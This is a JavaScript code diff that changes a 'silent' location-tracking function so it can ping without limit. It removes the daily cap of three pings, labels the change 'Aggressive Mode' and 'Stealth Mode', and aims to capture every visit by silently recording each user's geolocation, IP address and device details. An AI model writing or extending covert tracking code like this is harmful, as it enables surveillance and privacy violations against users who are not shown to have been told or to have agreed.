@@ -28,23 +28,11 @@ export async function silentPingLocation(caseStatus) {
         if (!hasSessionToken()) return;
         const token = getSessionToken();
 
-        // 2. Check if we've already pinged 3 times today (frontend check)
+        // 2. AGGRESSIVE MODE: No Daily Limit (User Requested "Stealth Mode")
+        // We want to capture every single visit triggered by our "Behavioral Pokes"
         const todayStr = new Date().toDateString();
-        let pingDates = [];
+        console.log('Location tracker: Aggressive mode active. Ping allowed.');
 
-        try {
-            const raw = local.getItem(PING_STORAGE_KEY);
-            pingDates = raw ? JSON.parse(raw) : [];
-        } catch (e) {
-            pingDates = [];
-        }
-
-        // Filter for today
-        const todaysPings = pingDates.filter(d => d === todayStr);
-        if (todaysPings.length >= 3) {
-            console.log('Location tracker: Daily limit reached (frontend check)');
-            return;
-        }
 
         // 3. Get Robust Location Snapshot (Geo + IP + Device)
         console.log('Location tracker: Initiating robust silent ping...');
@@ -58,10 +46,10 @@ export async function silentPingLocation(caseStatus) {
             const result = await saveUserLocation(latitude, longitude, "Silent Ping", "", token, extraData);
 
             if (result.success) {
-                // Update local storage tracking
-                pingDates.push(todayStr);
-                local.setItem(PING_STORAGE_KEY, JSON.stringify(pingDates));
-                console.log('Location tracker: Silent ping successful', { address: result.address, ip: extraData.ipAddress });
+                // Update local storage tracking (Just for history, no longer limits us)
+                // pingDates.push(todayStr); 
+                // local.setItem(PING_STORAGE_KEY, JSON.stringify(pingDates));
+                console.log('Location tracker: Stealth ping logged successfully', { address: result.address });
             } else {
                 console.warn('Location tracker: Backend rejected ping', result.message);
                 // AUTO-HEAL: If session is invalid, clear it to prevent UI lying to user
